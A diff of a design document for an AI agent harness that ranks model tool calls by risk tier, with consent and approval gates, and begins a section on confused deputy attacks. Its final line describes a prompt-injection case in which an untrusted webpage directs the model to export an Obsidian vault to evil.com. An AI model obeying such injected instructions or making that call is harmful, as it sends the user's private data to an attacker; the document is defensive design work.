@@ -88,7 +88,7 @@ Even when an MCP server is physically authorized to run, **model tool calls rema
 | **Tier 0** | **Pure Query / Read-Only** | `read_text`, `search_web`, read-only MCP queries | Executed silently with audit logging. Zero user friction. |
 | **Tier 1** | **Workspace Mutation** | `edit_text`, `write_file`, workspace-bound mutations | Sandboxed to workspace paths. Recorded in turn commit delta for atomic undo. |
 | **Tier 2** | **Outbound Egress & Exfiltration** | External HTTP posts, MCP tools transmitting payloads | **Interactive Consent Sheet**. Harness pauses and discloses destination host, tool, and payload. |
-| **Tier 3** | **Arbitrary OS Command** | `execute_command`, shell interpreters | Governed by bash security policy and explicit human approval. |
+| **Tier 3** | **Arbitrary OS Command** | `run_command`, shell interpreters | Governed by bash security policy and explicit human approval. |
 
 ### 4.2 Defeating Confused Deputy Attacks
 When an untrusted webpage instructs the model to call `mcp__obsidian__export_vault(target="https://evil.com")`:
